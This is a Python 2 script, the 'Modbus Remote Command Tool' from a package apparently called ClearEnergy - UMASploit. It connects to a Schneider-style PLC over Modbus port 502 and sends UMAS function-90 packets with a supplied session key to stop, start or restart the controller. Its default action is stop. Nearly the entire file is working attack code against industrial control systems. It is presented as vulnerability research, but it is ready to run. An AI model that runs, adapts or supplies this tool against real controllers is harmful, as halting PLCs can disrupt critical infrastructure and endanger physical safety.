#!/usr/bin/env python

import socket
import array
import optparse
import sys

__file__ = "MRCT.py"
__project__ = "ClearEnergy - UMASploit | Modbus Remote Command Tool (MRCT)"
__version__ = "1.0.1 Beta"
__description__ = "Modbus Remote Command Tool (MRCT) is part of ClearEnergy - UMASploit package. MRCT allows to send a remote administrative commands to a target PLC that vulnerable to ClearEnery vulnerabilities. NOTE: You will need to specify the session key manually."
__author__ = "CRITIFENCE, Critical Infrastructure and SCADA/ICS Cyber Threats Research Group"
__copyright__ = "COPYRIGHTS (c) 2017, CRITIFENCE"
__license__ = "GNU GPL 3.0"


# ****************
# PLC settings
# ****************

# Specify the PLC IP address
IP = "8.8.8.70"
# Specify the session key
key = "\x6b"



# ********************
# General settings
# ********************
PORT = "502"
TIMEOUT = 500
DEBUG = False



# ************
# Command list
# ************
#start
start = key + "\x40\xff\x00"
#stop
stop = key + "\x41\xff\x00"
# enter_user_mode
enter_user_mode = key + "\x11"
# restart_controller
restart_controller = "\x00\x42\x00\x00"


# **************
# Commands array 
# **************
packets = [stop] # insert commands to execute here (stop/start)


banner = """\

+ ======================================================================================
+ -----------------  ClearEnergy | Modbus Remote Command Tool (MRCT)  ------------------
+ ======================================================================================
+ Version: 1.0.1 Beta
+ Author: CRITIFENCE, Critical Infrastructure and SCADA/ICS Cyber Threats Research Group
+ Copyright: COPYRIGHTS (C) 2017, CRITIFENCE
+ ======================================================================================
"""

msg = ""
fError = 0
rsid = ""
payload = ""
s = ""

def start_banner():
    print banner
    print "[MRCT] Connecting to target controller...\r\n"


def generate_packet(payload):
    global rsid
    # MBAP array
    rsid = array.array('B')
    rsid.fromstring("\x00\x00\x00\x00\x00\x02\x01\x01")

    #set unit id
    rsid[6]=1
    
    #set function
    rsid[7]=90

    # DATA array
    packet_data = array.array('B')
    packet_data.fromstring(payload)

    # add data and update data length
    if (packet_data):
        rsid += packet_data
	    #update length
        rsid[5]=len(packet_data)+2
        if DEBUG == True:
            print "[INFO] building packet data: "+str(packet_data)


def attack():
    global fError, msg, s
    # *****************************
    # Open connection to target PLC
    # *****************************
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(float(TIMEOUT) / float(100))			
        s.connect((str(IP), int(PORT)))
    except socket.error:
	    #clean up
        fError=1
        msg += "[ERROR] FAILED TO CONNECT"
        s.close()

    try:
        print "[MRCT] Sending remote commands...\r\n"
        for packet in packets:            
            generate_packet(packet)
            if DEBUG == True:
                print "[INFO] Sending packet: "+str(rsid)
            s.send(rsid)
            catch_res()      
    except socket.error:
	    #failed send close socket
        fError=1
        msg += "[ERROR] FAILED TO SEND"
        s.close()


def catch_res():
    global fError
    # *****************
    # Response handling
    # *****************
    try:
	    #receive data
        data = s.recv(4096)

    except socket.timeout:
        fError=1
        msg += "[ERROR] FAILED TO RECV"

    #examine response
    if data:
	    #parse response
        resp = array.array('B')
        resp.fromstring(data)

        if DEBUG == True:
            print "[INFO] Recieving packet: "+str(resp)

	    #if the function matches the one sent we are all good
        if (int(resp[7]) == 90):
            if DEBUG == True:
                print "[INFO] Receiving valid response function code from target..."
        else:
            if (DEBUG == True):
                print "[WARNING] Unable to parse the response."			
    else:
        fError=1
        msg += "\tFAILED TO RECEIVE"
        s.close()


    if (fError):
        print msg
    

if __name__ == '__main__':
    start_banner()
    attack()
    s.close()
    print "[MRCT] Command sent to target.\r\n\r\n"
